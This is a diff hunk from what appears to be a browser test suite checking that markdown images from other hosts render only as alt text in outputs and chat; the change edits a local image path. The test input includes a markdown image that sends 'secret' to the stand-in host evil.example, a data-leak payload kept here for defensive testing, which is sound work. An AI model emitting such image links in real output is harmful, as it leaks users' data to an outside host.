@@ -156,7 +156,7 @@ test('an svg figure keeps its drawing, runs nothing and loads nothing from anoth
 })
 
 test('a markdown image from another host is its alt text, in an output and in the chat', async () => {
-  const md = '![leak](https://evil.example/md.png?d=secret) and ![kept](/api/ws/mini/media/a.png)'
+  const md = '![leak](https://evil.example/md.png?d=secret) and ![kept](/api/ws/mini/media?path=a.png)'
   for (const where of ['output', 'chat']) {
     const id = where === 'output' ? await output({ 'text/markdown': md }) : await page.evaluate((text) => (window as any).__t.chat(text), md)
     await settle(200)
